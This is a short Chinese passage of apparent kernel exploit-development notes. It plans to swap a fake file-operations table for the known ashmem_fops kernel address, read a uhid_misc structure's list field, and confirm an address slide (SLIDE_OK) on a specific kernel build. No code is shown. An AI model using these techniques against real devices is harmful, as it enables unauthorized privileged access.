→ 验证手段：用 `ashmem_fops`（`0xffffffc0812ff898`，已知符号）替代手工 fake_fops，
   并 dump `uhid_misc` 实例的真实 `list` 字段（读端验证），消除「偏移猜测」这一自由度。

**L2 唯一假设**：MEY 6.6.118 的 `do_futex` 独立 ⇒ `pselect` 路线 shift≈0 可用。
→ 验证手段：先修 `target.h` 双副本分叉，再以 shift=0 起跑单 boot 验证 `SLIDE_OK`。
